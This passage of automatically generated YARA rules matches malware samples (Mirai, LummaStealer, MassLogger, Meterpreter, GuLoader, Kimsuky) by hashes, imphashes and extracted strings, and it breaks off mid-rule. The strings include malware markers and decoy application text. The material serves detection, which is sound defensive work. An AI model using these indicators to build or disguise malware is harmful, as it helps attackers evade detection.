      $s11 = "SELECT'INSERT INTO %s.'||quote(name)||' SELECT*FROM\"%w\".'||quote(name)FROM %s.sqlite_schema WHERE type='table'AND coalesce(roo" ascii /* score: '10.00'*/
      $s12 = "subrtnsig:%d,%s" fullword ascii /* score: '9.50'*/
      $s13 = "internal query planner error" fullword ascii /* score: '9.00'*/
      $s14 = "GetSubtype" fullword ascii /* score: '9.00'*/
      $s15 = "timediff" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__007cd810_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_30 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_007cd810.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_76cff505.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "007cd810db2b95805793f8b38d89946479092c54385a4e127bb9dfe5512ade1c"
      hash2 = "76cff505d993baaecd718a3b0de1814da0aef73ce932d95bacbc6d842db38807"
   strings:
      $s1 = "UpdateLastLogin" fullword ascii /* score: '15.00'*/
      $s2 = "<LastLoginDate>k__BackingField" fullword ascii /* score: '15.00'*/
      $s3 = "   - Keep track of common errors" fullword wide /* score: '13.00'*/
      $s4 = "   - Get adequate sleep the night before" fullword wide /* score: '12.00'*/
      $s5 = "   - Question: Formulate questions about the content" fullword wide /* score: '12.00'*/
      $s6 = "   - Preview headings and subheadings first" fullword wide /* score: '12.00'*/
      $s7 = "   - Skimming: Get general overview" fullword wide /* score: '12.00'*/
      $s8 = "   - Makes it easier to get partial credit on exams" fullword wide /* score: '12.00'*/
      $s9 = "   - Plan your study sessions in advance" fullword wide /* score: '10.00'*/
      $s10 = "   - Use the Eisenhower Matrix (urgent/important)" fullword wide /* score: '10.00'*/
      $s11 = "   - Add keywords and questions in the cue column" fullword wide /* score: '10.00'*/
      $s12 = "   - Summarize key points at the bottom" fullword wide /* score: '10.00'*/
      $s13 = "   - Indent supporting details under main points" fullword wide /* score: '10.00'*/
      $s14 = "   - Identify weak areas and focus study time there" fullword wide /* score: '10.00'*/
      $s15 = "   - Share different perspectives and approaches" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Meterpreter_signature__fb6bd8ebf4e6421b53c55dfe7d3c43af_imphash__Meterpreter_signature__fb6bd8ebf4e6421b53c55dfe7d3c43af_im_31 {
   meta:
      description = "_subset_batch - from files Meterpreter(signature)_fb6bd8ebf4e6421b53c55dfe7d3c43af(imphash).exe, Meterpreter(signature)_fb6bd8ebf4e6421b53c55dfe7d3c43af(imphash)_9b765114.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9627fdff5f980d069a4e98726c468c5b75297551392a6cd38bf95078d68f75c1"
      hash2 = "9b765114e089a88af8743776dc29a6a45fc7ebbca184cff86ac048d4f4ebabbd"
   strings:
      $s1 = "C:\\local0\\asf\\release\\build-2.2.14\\support\\Release\\ab.pdb" fullword ascii /* score: '21.00'*/
      $s2 = " Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/<br>" fullword ascii /* score: '17.00'*/
      $s3 = "    -T content-type Content-type header for POSTing, eg." fullword ascii /* score: '15.00'*/
      $s4 = "    -p postfile     File containing data to POST. Remember also to set -T" fullword ascii /* score: '12.00'*/
      $s5 = "    -h              Display usage information (this message)" fullword ascii /* score: '12.00'*/
      $s6 = "    -i              Use HEAD instead of GET" fullword ascii /* score: '12.00'*/
      $s7 = " Licensed to The Apache Software Foundation, http://www.apache.org/<br>" fullword ascii /* score: '10.00'*/
      $s8 = "    -r              Don't exit on socket receive errors." fullword ascii /* score: '10.00'*/
      $s9 = " This is ApacheBench, Version %s <i>&lt;%s&gt;</i><br>" fullword ascii /* score: '10.00'*/
      $s10 = "    -k              Use HTTP KeepAlive feature" fullword ascii /* score: '10.00'*/
      $s11 = "    -X proxy:port   Proxyserver and port number to use" fullword ascii /* score: '9.00'*/
      $s12 = "  %d%%  %5I64d" fullword ascii /* score: '8.00'*/
      $s13 = "    -H attribute    Add Arbitrary header line, eg. 'Accept-Encoding: gzip'" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == "481f47bbb2c9c21e108d65f52b04c448" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__06660a84_Mirai_signature__082d7412_Mirai_signature__0e4fcde7_32 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_06660a84.elf, Mirai(signature)_082d7412.elf, Mirai(signature)_0e4fcde7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "06660a84c056b27557fb8393ebc876f60f2d5ece42f6f80d918aa2e65c4ff973"
      hash2 = "082d74126d4fba831e4d434f7a0217700f93cebfc861ac4aa204706f32e7ca5b"
      hash3 = "0e4fcde7b003b132755efafc2e80eccd84c243bd5618108553bb6cbbc068bcfa"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s5 = "deexec" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s7 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s8 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s9 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s10 = "scanppc" fullword ascii /* score: '9.00'*/
      $s11 = "scanspc" fullword ascii /* score: '9.00'*/
      $s12 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s13 = "scanmips" fullword ascii /* score: '9.00'*/
      $s14 = "vaiolmao" fullword ascii /* score: '8.00'*/
      $s15 = "flexsonskids" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_impha_33 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash3 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash4 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash5 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash6 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash7 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash8 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash9 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash10 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s2 = "runtime.(*mSpanStateBox).get" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.isSweepDone" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.(*stackScanState).getPtr" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.chanparkcommit" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.memhashFallback" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.strhashFallback" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.schedEnableUser" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.pallocSum.end" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.binarySearchTree" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.memhash64Fallback" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.boundsError.Error" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.pallocSum.max" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.memhash32Fallback" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.dropm" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_34 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash3 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash4 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash5 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash6 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash7 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash8 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash9 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash10 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
      hash11 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash12 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash13 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.heapBits.forward" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.getLoadLibraryEx" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getStackMap" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getLoadLibrary" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.getArgInfo" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.heapBits.forwardOrBoundary" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.getGetProcAddress" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.name.data" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0391bfcb_Mirai_signature__03c07013_Mirai_signature__0407e77f_Mirai_signature__0bfce519_35 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0391bfcb.elf, Mirai(signature)_03c07013.elf, Mirai(signature)_0407e77f.elf, Mirai(signature)_0bfce519.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0391bfcb6427fd93c2b2fcb03459914ebae9b2ed16f05288c0326674b8d7e460"
      hash2 = "03c070132407d7dc3b3e106413ad6eea9ee596e6af512e354215589a6f936787"
      hash3 = "0407e77f05ad9914cd0bf67fcb9aad2b140a0c5c5eebfb8e68a35c92d0da127e"
      hash4 = "0bfce519f37a34db3cf52cd204088d4ee77544df979faac1bf51fa8612063566"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s6 = "/proxy.txt" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imph_36 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1102be28.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f45a0800.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7a29f40dd40b565108145331b7ead5d6a17b46a88dfc4c58c013462683f8c75a"
      hash2 = "1102be281ceadcc5966ddd8ed9fb1fe436d920bbfcd376dd9ba252ab03d84c7b"
      hash3 = "f45a08004e83115a292abe23532991b07eb50bd08a19217ef4fa09420a6dad10"
   strings:
      $s1 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s2 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s3 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s4 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s5 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s6 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s7 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s8 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s9 = "get_restart" fullword ascii /* score: '9.00'*/
      $s10 = "_rectangleLogoOffset" fullword ascii /* score: '9.00'*/
      $s11 = "get_help_FILL0_wght300_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s12 = "GetWordList" fullword ascii /* score: '9.00'*/
      $s13 = "_rectangleLogo" fullword ascii /* score: '9.00'*/
      $s14 = "get_GamesPlayed" fullword ascii /* score: '9.00'*/
      $s15 = "get_isFirstTime" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__37 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash3 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash4 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash5 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash6 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash7 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash8 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s2 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s3 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s6 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s7 = "syscall.procGetTempPathW" fullword ascii /* score: '15.00'*/
      $s8 = "syscall.procProcess32NextW" fullword ascii /* score: '14.00'*/
      $s9 = "syscall.procNetUserGetInfo" fullword ascii /* score: '14.00'*/
      $s10 = "syscall.procOpenProcess" fullword ascii /* score: '14.00'*/
      $s11 = "syscall.procProcess32FirstW" fullword ascii /* score: '14.00'*/
      $s12 = "syscall.procExitProcess" fullword ascii /* score: '14.00'*/
      $s13 = "syscall.procTerminateProcess" fullword ascii /* score: '14.00'*/
      $s14 = "syscall.procgethostbyname" fullword ascii /* score: '13.00'*/
      $s15 = "go.itab.*syscall.DLLError,error" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _GuLoader_signature__6e7f9a29f2c85394521a08b9f31f6275_imphash__96e48990_GuLoader_signature__6e7f9a29f2c85394521a08b9f31f6275_38 {
   meta:
      description = "_subset_batch - from files GuLoader(signature)_6e7f9a29f2c85394521a08b9f31f6275(imphash)_96e48990.exe, GuLoader(signature)_6e7f9a29f2c85394521a08b9f31f6275(imphash)_ebfd7557.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "96e48990a90a0329b7d614362335800a51f8bac423b5f5d0809bec683254665d"
      hash2 = "ebfd755715d769bf9f0012a3632bb6b42bc6918a70420abc93142ad93adaa59c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "archdapifership.exe" fullword wide /* score: '22.00'*/
      $s3 = "???6???4???4???4???4???4???4???4???2???2???2???2???2???2???2???0???0???0???0???0???0???0???.???.???.???,???,???,???,???*???*???(" ascii /* score: '9.00'*/ /* hex encoded string 'dDDD""" ' */
      $s4 = "!!!|,,,f999TKKKDaaa8xxx0" fullword ascii /* score: '9.00'*/
      $s5 = "???6???4???4???4???4???4???4???4???2???2???2???2???2???2???2???0???0???0???0???0???0???0???.???.???.???,???,???,???,???*???*???(" ascii /* score: '9.00'*/ /* hex encoded string 'dDDD""" ' */
      $s6 = "!!!|,,,f999TLLLDaaa8yyy0" fullword ascii /* score: '9.00'*/
      $s7 = "!!!|,,,f999TJJJF]]]8uuu0" fullword ascii /* score: '9.00'*/
      $s8 = "!!!|,,,h999VIIIF^^^:sss0" fullword ascii /* score: '9.00'*/
      $s9 = "???&???,???2???6???<" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s10 = "forenende" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "6e7f9a29f2c85394521a08b9f31f6275" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3d66174c_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_39 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3d66174c.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_86a4c83d.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d8f84c5d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d66174c58d543c350e84a90f101449af1a8015a255626f1fbfe60b82c9719c8"
      hash2 = "86a4c83d0629495fbfbbcd6df608209d5d873d18e2705dd6dcbca013774f3747"
      hash3 = "d8f84c5d5d307bf8a54887b9f80de352dbe84880987aec5c2923c0e301a916e2"
   strings:
      $s1 = "SetBinaryOperation" fullword ascii /* score: '12.00'*/
      $s2 = "{0:HH:mm:ss} - {1}" fullword wide /* score: '12.00'*/
      $s3 = "Calculator Plus - History Export" fullword wide /* score: '11.00'*/
      $s4 = "LogBase10" fullword ascii /* score: '10.00'*/
      $s5 = "CalculatorHistory_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '10.00'*/
      $s6 = "GetLastEntry" fullword ascii /* score: '9.00'*/
      $s7 = "set_Operand2" fullword ascii /* score: '9.00'*/
      $s8 = "PerformUnaryOperation" fullword ascii /* score: '9.00'*/
      $s9 = "CreateBasicOperatorButtons" fullword ascii /* score: '9.00'*/
      $s10 = "CreateOperatorButtons" fullword ascii /* score: '9.00'*/
      $s11 = "<Operand1>k__BackingField" fullword ascii /* score: '9.00'*/
      $s12 = "GetHistoryStrings" fullword ascii /* score: '9.00'*/
      $s13 = "GetHistoryByDate" fullword ascii /* score: '9.00'*/
      $s14 = "ghostSeed" fullword ascii /* score: '9.00'*/
      $s15 = "OperatorButton_Click" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_imphash__1f8a0a52_LummaStealer_signature__4035d2883e01d64f3e7a9dcc_40 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash2 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash3 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash4 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash5 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash6 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash7 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash8 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash9 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s5 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s6 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s10 = "syscall.procCreateProcessW" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.data" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.end" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.buckhash" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.useAeshash" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.inf" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__41 {
   meta:
